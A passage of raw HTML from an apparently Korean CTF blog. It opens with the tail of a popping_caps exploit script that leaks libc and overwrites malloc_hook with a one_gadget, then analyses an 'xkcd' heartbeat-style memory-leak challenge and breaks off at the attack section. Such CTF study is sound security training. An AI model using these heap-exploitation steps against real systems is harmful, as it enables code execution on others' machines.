operator\">+</span><span class=\"token number\">0x10a45c</span>\n\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"libc\"</span><span class=\"token punctuation\">,</span> libc<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"malloc_hook\"</span><span class=\"token punctuation\">,</span> malloc_hook<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one_gadget\"</span><span class=\"token punctuation\">,</span> one_gadget<span class=\"token punctuation\">)</span>\n\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x3a8</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">0x210</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xf8</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>malloc_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>one_gadget<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\">바이너리 분석</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\">바이너리 실행 결과</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%B7%A8%EC%95%BD%ED%95%9C-%EB%B6%80%EB%B6%84\">취약한 부분</a></p>\n<ul>\n<li><a href=\"#%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%A3%BC%EC%86%8C-%EB%85%B8%EC%B6%9C\">메모리 주소 노출</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\">main 함수 부분</a></p>\n</li>\n<li>\n<p><a href=\"#bye-%ED%95%A8%EC%88%98-%EB%B6%80%EB%B6%84\">Bye 함수 부분</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-idea\">Exploit Idea</a></p>\n</li>\n<li>\n<p><a href=\"#exploit-scenario\">Exploit Scenario</a></p>\n</li>\n<li>\n<p><a href=\"#tcache_perthread_struct\">tcache_perthread_struct</a></p>\n</li>\n<li>\n<p><a href=\"#heap-%EC%88%9C%EC%84%9C-%ED%8C%8C%EC%95%85\">heap 순서 파악</a></p>\n</li>\n<li>\n<p><a href=\"#fake-chunk%EB%A5%BC-%EB%A7%8C%EB%93%A4%EA%B8%B0-%EC%9C%84%ED%95%B4-malloc0x3a8-%ED%95%98%EB%8A%94-%EC%9D%B4%EC%9C%A0\">fake chunk를 만들기 위해 malloc(0x3a8) 하는 이유</a></p>\n</li>\n<li>\n<p><a href=\"#integer-issue\">integer issue</a></p>\n</li>\n<li>\n<p><a href=\"#writep64malloc_hook\">write(p64(malloc_hook))</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 popping_caps 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍔"},"fields":{"slug":"/csaw_popping_ctf_writeup/"}},"prev":{"id":"4f92bcc5-6f91-5e27-8ff5-b9b3879be3ae","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAlElEQVQI1z3I4Q6CIBRAYV8ES0i5iAKyZXpVxHSzzPUGvf9rNHJrOz++nWheP8N9R783buv8juOrddutf7TuqazLNea6EyVK0wcoFApL66BohMYIx7ebl8kvy7ziONmmU7aG0ghV8ULTTCQZJCkkAeIcAGH+TqSsr66tlrI2RqaCME4oJzQjlMeMxwxOF4gZHDj6zy9QXiFQXvghXAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png\"\n        srcset=\"/static/284023c502fc60db87e32cf7d9b3a3b3/e9ff0/0.png 180w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/f21e7/0.png 360w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/37523/0.png 720w,\n/static/284023c502fc60db87e32cf7d9b3a3b3/218a4/0.png 1052w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>기타 정보</p>\n<ul>\n<li>statically linked, 64 bit</li>\n<li>Heartbeat packet</li>\n</ul>\n<h2 id=\"보호기법\" style=\"position:relative;\"><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\" aria-label=\"보호기법 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>보호기법</h2>\n<ul>\n<li>No RELRO</li>\n<li>No Canary found</li>\n<li>NX enabled</li>\n<li>No PIE</li>\n</ul>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 분석</h2>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">root@e5e68faa5052<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>Zer0Luck<span class=\"token operator\">/</span>challenges<span class=\"token operator\">/</span>xkcd# <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>xkcd \nCould not open the flag<span class=\"token punctuation\">.</span>\n\n<span class=\"token operator\">-></span> 현재 디렉토리에 flag 파일을 생성한 후에 분석을 시도하자</code></pre></div>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 468px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 126.11111111111113%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAZCAIAAAC+dZmEAAAACXBIWXMAAAsTAAALEwEAmpwYAAADB0lEQVQ4y4VU2YobSwz1/39OPiHkNTE3kMy120vbvVV1d+27art4bGaIM7kRokCgwzlSSdpstxxj1zRwOEA/6cM0oEX3nWUsSJmEiL87YwCQv3xhm67T3lfOozY5p1py9T4CpFJqjLl+ZDmXWuu3b3Izjv50Mm2rTydPaTQWpPBS2hiLUrGU8pp/f2spN0/pFn79KjcIOWMCQA4hALiUACBJUY0qOecUgzVRiOpctjbfOd+ZKQXvC2MRIdH3K8bi0o8vR3xsyf7Ed0fSduKK9KGf8CohpFofzHdw9D4Og7xePULZmiKd7FXLHF01mxVljioQWCOskbXxmTnGOo76eqWMWUoN40xpRZjoRtcNAU3GA0hrIpTnhlEKSnlrQamKcXa2hBSYpcTSSc7CKil9SjmXkkt+BhMCpZb2XM8d26PD9+u/R9ztlwPSKABo0NSRWc+TGqW24almQiClTGnFOCyLZcxx7qR05fEv7/YW/MIcQtEa1jUOgxtHHVIQVjqXXvMemPLhkFAKzlWM4XoNbRuGAYx5wP5k72DGQIh6PKam8btdHAbPueHcrasWolKalQw+BeXsx7JTqkKEabLDoC8XxiSb6aqVl7IyloXwkKL14Y55lg1QxzH1vZsmf2mBi/inlfhA9rrW7bY0TcY4TpNRKtSa7z0qpfzS8d+ZjYlSBmNuoy94paQsc5WiQPjbShICzoGU2bhAtMRUY2InYjFTRFPldE7l/8C11vZcD2fe9G2HMJrZKphNmgdGDQ+v/OVtpWt5kp3Wtcw4s7UaC1QJpiX3AiD9RTbGXoiyEECLnxanvFkcJo6sdl0Fd+BDCj7d3phjzNFGGyC+naFwaeu5W4/o8qPbt3hsSUctizEhPc0GUUcXsyxmYZZxx3vZU6Ee4PbsCc1okSvTlNmFKqmtj8EEl3P2Lt8aVu61PuY8xfsNE5v9zhHqWJgl0Fi1KTQUabNkEcfqtIbbTf2o5u1Wbj5/XrZb9v0f9fJT73f27s3ONXu725mmMbvds7+86MvFffo0/wfo2pPCnjlxWgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png\"\n        srcset=\"/static/f3572d894a13fd37dbfff522cf8d4e93/e9ff0/1.png 180w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/f21e7/1.png 360w,\n/static/f3572d894a13fd37dbfff522cf8d4e93/90372/1.png 468w\"\n        sizes=\"(max-width: 468px) 100vw, 468px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>flag 파일의 내용을 읽어와 flag 변수에 집어넣는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 606px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA2klEQVQY03WMwY6CMBRF+f+vmaWJOgsZYhCTJkR2IyI0xYqlgAxQ+96rIZrMYjI3Z3PPTa7HWL3byc1GhKFMEp2mXV0/ug5KMR4zfSqaovipbpPWUNddUXxwbqSEsrTXq/U4zy8XluehEKxpztYiETnnjIFxtPhucxBhHIUxv8bL86MQUZYFnEdKpYgOYB61npQa+v4xTYBIADNEjogQ33hV9a11JKWv1H4YTs6513Hfm7adiAAR3T/xVqtkvf5aLD6Xy8D3kzi+x/H9cOi3WxUEtyjSjLUv+ZcnxJsUYnK/7U8AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png\"\n        srcset=\"/static/c7e0df71fb22c6468f806646d2a22537/e9ff0/2.png 180w,\n/static/c7e0df71fb22c6468f806646d2a22537/f21e7/2.png 360w,\n/static/c7e0df71fb22c6468f806646d2a22537/4d4a2/2.png 606w\"\n        sizes=\"(max-width: 606px) 100vw, 606px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">flag 전역 변수</code></pre></div>\n<ul>\n<li>flag 변수는 .bss 섹션에 존재하며 전역 변수로 확인된다.</li>\n<li>사용자의 입력 값을 토대로 특정 조건을 수행하게 되는데 <code class=\"language-text\">strtok</code> 함수를 바탕으로 문자 단위로 짤라 해당 문자열이 포함되는 지를 확인하고 있다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">SERVER<span class=\"token punctuation\">,</span> ARE YOU STILL THERE<span class=\"token operator\">?</span>\n\nIF SO<span class=\"token punctuation\">,</span> REPLY \"</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 296px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 23.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA5ElEQVQY03WPTWvCQBiE/f8/RPAgouDJY6ARNqmxFsMeFDWhfsRkk+y7m+1+vWUplPbQYY7zzDCj40Hu95Cm3XbLdzueJIIQuV7zKHpkWff23r5sivj1I8vaPIcfUwpp2o8Q0XmvFEppOTenk7lczPlsKL0/n9JZZ1AYq7p2wL8SwgVYa8e5b1tT1/J2Y9drNQyfVaXKUve9Du02pK313zbGe4+MmQB774VAzh2ALUssCqTUMmabRiml8R+F5eNB5jkslzAei/kcFot6MumnU5jNIIoYITyOuySB1epBSEOp+P35C3BhExF8GT7yAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png\"\n        srcset=\"/static/6bb772078781b14a91141d3726fe538e/e9ff0/3.png 180w,\n/static/6bb772078781b14a91141d3726fe538e/b1a44/3.png 296w\"\n        sizes=\"(max-width: 296px) 100vw, 296px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"strtok\" style=\"position:relative;\"><a href=\"#strtok\" aria-label=\"strtok permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>strtok</h2>\n<ul>\n<li>그후 해당 부분에서 <code class=\"language-text\">\"</code> 까지 잘라 해당 문자열의 값을 <code class=\"language-text\">globals</code> 전역 변수에 memcpy를 하는 것을 확인할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 597px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAdklEQVQI1xXCWw6CMBAFUPa/B92FayB+EPiAKIkBNUErD1PKTTN12hnDycny/FuWtqps2/rr5fR4Hub5aMx5GAggwAI/IDoXx3G/LHGaGJCicFld37vu1ve9MR/nXkRvVQ0hAYFZmDUlERFmWde990KUVLVptj/N+27Tu6wEfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png\"\n        srcset=\"/static/2ce07033ee502d0147643f29bd5e3fa5/e9ff0/4.png 180w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/f21e7/4.png 360w,\n/static/2ce07033ee502d0147643f29bd5e3fa5/17602/4.png 597w\"\n        sizes=\"(max-width: 597px) 100vw, 597px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"globals-전역-변수\" style=\"position:relative;\"><a href=\"#globals-%EC%A0%84%EC%97%AD-%EB%B3%80%EC%88%98\" aria-label=\"globals 전역 변수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>globals 전역 변수</h2>\n<ul>\n<li><code class=\"language-text\">globals</code> 전역 변수는 총 512바이트이며, 같은 .bss 영역이므로 앞에서 선언된 flag와는 0x200차이가 나는 것을 확인할 수있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 616px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 22.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAwElEQVQI102LMXLCMBBFff8bpM8NcgNXoXAKm86BEYMRtsGSDJJ2tLvWMhpS5M+b37z/q7oe2/a+35vj8a7U1+Xyebt9nE6/Wm/LMizL2YfNe3aOjWFrC8aw9zyOqdrtVN+fD4frNJkYO8RBRAASEsm/AMi6SoxCJG/jPVVd12j9o3Vr7RCC5FyEtTBap2cHEYk2kXJI6e+JWDaPB1VNUytVK/U9Tb1zgMjM+flMIRAAE+U365rnuXSMOYTMnK3FF9mX4R6RuuOwAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png\"\n        srcset=\"/static/a66fd776c64ddf1016048ee1ef70b624/e9ff0/5.png 180w,\n/static/a66fd776c64ddf1016048ee1ef70b624/f21e7/5.png 360w,\n/static/a66fd776c64ddf1016048ee1ef70b624/40040/5.png 616w\"\n        sizes=\"(max-width: 616px) 100vw, 616px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>0x200 바이트 차이</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 33.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6UlEQVQY03WOTYuDMBCG/f+/p/S41I9sj0tPBQ8tVYvGRJOYGM3ExGIFcZftw8sc3pkHJjgcouMRpWnZdY5ze7t1WaZ+LtXl+sREsxba1jAGnNstjFkpp/tdBwhdz+eUUjG/YWyQ0hSFaJjWGpybAIxz07zD+2U2DQRx/BXHYVVVa0tIL4TJixE3g7F2L2xxbmkIWeQIoe+6JusRxorzsciHR0k73b81P/9mLSiFIEmiJEEY43VR14qQIc+VkKD1/C9/5GSTCekZH/NMlk8lxGitBYCPchie9jKlPalNSUWjWgPgvXef334B15WMo4wkAEoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png\"\n        srcset=\"/static/cd58e795091c689ea83dab4ecabbf93a/e9ff0/6.png 180w,\n/static/cd58e795091c689ea83dab4ecabbf93a/f21e7/6.png 360w,\n/static/cd58e795091c689ea83dab4ecabbf93a/37523/6.png 720w,\n/static/cd58e795091c689ea83dab4ecabbf93a/0955e/6.png 901w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"비교\" style=\"position:relative;\"><a href=\"#%EB%B9%84%EA%B5%90\" aria-label=\"비교 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>비교</h2>\n<ul>\n<li>strtok <code class=\"language-text\">(</code> <code class=\"language-text\">)</code> 한 내부의 특 정 정수 값을 바탕으로 <code class=\"language-text\">__isoc99_sscanf</code> 함수의 인자로 쓰이는 것을 확인할 수 있다.</li>\n<li>입력 받은후 <code class=\"language-text\">globals</code> 전역 변수의 길이 값과 <code class=\"language-text\">()</code> 내부에있는 값을 비교하여  <code class=\"language-text\">globals</code> 의 길이가 작을 경우 <code class=\"language-text\">()</code> 입력한 길이 만큼 출력을 한다.</li>\n<li>만약 더 큰 값을 입력했다면 <code class=\"language-text\">Nice Try</code>를 출력한다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 463px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBUlEQVQY0zXN7U7CMBQA0L2JmIFssK7tXXt717IBlX2wScBINNEoGuZHou//28TE/yc5Qb392d99b3cf3f6zP3y1N++rzXPVnZt+aPrhujr55tU3p7obqvZtVb20/RlwX/pHck9B3T2Ufg0md2tPRamtQ7eQSOu61tap3Krcabso/UaiEdpkhsIovryajCMIfH2vyM0FSrRcUaqIK4oYmMWKAc6FZoApmIyKaSKo8IlEoW0YzS7GEByOA1oXMVBUSLRC51LbmKu89FwRA+QZ8YzQLeMUqPDpXxBGs9FEBrfHc9XtfN2nGf1rE6eAtkyEnvGMSWSAYNw0Edou50KxzIRRPJrAL24URLi3b+FYAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./7.png\"\n        title=\"./7.png\"\n        src=\"/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png\"\n        srcset=\"/static/b3fb4fb36506bf325dc0575af09e8cee/e9ff0/7.png 180w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/f21e7/7.png 360w,\n/static/b3fb4fb36506bf325dc0575af09e8cee/71ce0/7.png 463w\"\n        sizes=\"(max-width: 463px) 100vw, 463px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"공격\" style=\"position:relative;\"><a href=\"#%EA%B3%B5%EA%B2%A9\" aria-label=\"공격 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" 